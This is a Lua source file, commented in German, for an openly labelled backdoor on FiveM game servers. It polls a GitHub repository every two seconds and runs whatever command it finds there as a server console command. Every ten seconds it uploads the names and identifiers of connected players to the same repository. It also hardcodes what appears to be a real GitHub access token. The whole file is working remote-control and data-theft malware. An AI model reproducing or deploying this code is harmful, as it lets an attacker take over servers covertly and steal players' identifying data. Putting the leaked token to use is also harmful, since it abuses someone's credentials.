-- ===============================================
-- FIVEM ADVANCED BACKDOOR - GITHUB VERSION
-- ===============================================
-- Dieser Code läuft auf dem FIVEM SERVER und nutzt GitHub als Datenspeicher.

-- --- KONFIGURATION ---
-- Dein GitHub Benutzername und Repo Name
local GITHUB_USERNAME = "vSkeezy" -- <<<<< DEIN GITHUB BENUTZERNAME
local REPO_NAME = "test2" -- <<<<< DEIN REPOSITORY NAME

-- Dein GitHub Personal Access Token mit 'repo' und 'workflow' Berechtigungen!
local GITHUB_TOKEN = "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" -- <<<<< DEIN TOKEN

-- Die Dateien, die wir nutzen
local COMMANDS_FILE_PATH = "commands.json"
local PLAYERS_FILE_PATH = "players.json"

-- GitHub API URLs
local COMMANDS_API_URL = ("https://api.github.com/repos/%s/%s/contents/%s"):format(GITHUB_USERNAME, REPO_NAME, COMMANDS_FILE_PATH)
local PLAYERS_API_URL = ("https://api.github.com/repos/%s/%s/contents/%s"):format(GITHUB_USERNAME, REPO_NAME, PLAYERS_FILE_PATH)


-- --- DER BACKDOOR-CODE ---
local lastCommandsState = {}

-- Hilfsfunktion, um eine Base64-kodierte Zeichenfolge zu dekodieren
local function b64_decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end)):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x < 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end)
end

-- Hilfsfunktion, um eine Zeichenfolge zu Base64 zu kodieren
local function b64_encode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x)
        local r,b='',x:byte()
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
        return r;
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data%3+1])
end

-- Funktion: Sendet die Spielerliste an GitHub
local function uploadPlayerList()
    local players = {}
    for _, playerId in ipairs(GetPlayers()) do
        table.insert(players, {
            id = tonumber(playerId),
            name = GetPlayerName(playerId),
            identifier = GetPlayerIdentifier(playerId, 0)
        })
    end

    local playerDataJson = json.encode(players)

    PerformHttpRequest(PLAYERS_API_URL, function(errorCode, resultData, resultHeaders)
        if errorCode == 200 then
            local data = json.decode(resultData)
            local content = b64_encode(playerDataJson)
            local body = json.encode({
                message = ("Update player list (%d online)"):format(#players),
                content = content,
                sha = data.sha
            })

            PerformHttpRequest(PLAYERS_API_URL, function(err, res, hdrs)
                if err == 200 then
                    print("[BACKDOOR] Spielerliste erfolgreich hochgeladen.")
                else
                    print("[BACKDOOR] Fehler beim Hochladen der Spielerliste: " .. tostring(err))
                end
            end, 'PUT', body, {
                ["Authorization"] = "token " .. GITHUB_TOKEN,
                ["Content-Type"] = "application/json"
            })
        else
            print("[BACKDOOR] Konnte Spielerliste nicht abrufen zum Update (Fehler: " .. tostring(errorCode) .. "). Erstelle neue Datei.")
            -- Wenn die Datei nicht existiert, erstellen wir sie
            local content = b64_encode(playerDataJson)
            local body = json.encode({
                message = ("Create player list (%d online)"):format(#players),
                content = content
            })
            PerformHttpRequest(PLAYERS_API_URL, function(err, res, hdrs)
                if err == 201 then -- 201 Created ist der Erfolgstatus für neue Dateien
                    print("[BACKDOOR] Spielerliste erfolgreich erstellt.")
                else
                    print("[BACKDOOR] Fehler beim Erstellen der Spielerliste: " .. tostring(err))
                end
            end, 'PUT', body, {
                ["Authorization"] = "token " .. GITHUB_TOKEN,
                ["Content-Type"] = "application/json"
            })
        end
    end, 'GET', '', {
        ["Authorization"] = "token " .. GITHUB_TOKEN
    })
end

-- Funktion: Führt Befehle aus
local function executeCommands()
    PerformHttpRequest(COMMANDS_API_URL, function(errorCode, resultData, resultHeaders)
        if errorCode == 200 then
            local data = json.decode(resultData)
            local commands = json.decode(b64_decode(data.content))

            if commands.action and commands.action ~= lastCommandsState.action then
                print("[BACKDOOR] Führe Aktion aus: " .. commands.action)
                ExecuteCommand(commands.action)
                lastCommandsState = commands
            end
        else
            print("[BACKDOOR] Fehler beim Abrufen der Befehle (Fehler: " .. tostring(errorCode) .. ").")
        end
    end, 'GET', '', {
        ["Authorization"] = "token " .. GITHUB_TOKEN
    })
end

-- Hauptschleifen
CreateThread(function()
    while true do
        -- Spielerliste alle 10 Sekunden hochladen
        uploadPlayerList()
        Citizen.Wait(10000)
    end
end)

CreateThread(function()
    while true do
        -- Befehle alle 2 Sekunden abfragen
        executeCommands()
        Citizen.Wait(2000)
    end
end)

print("[BACKDOOR] Initialisiert und bereit.")
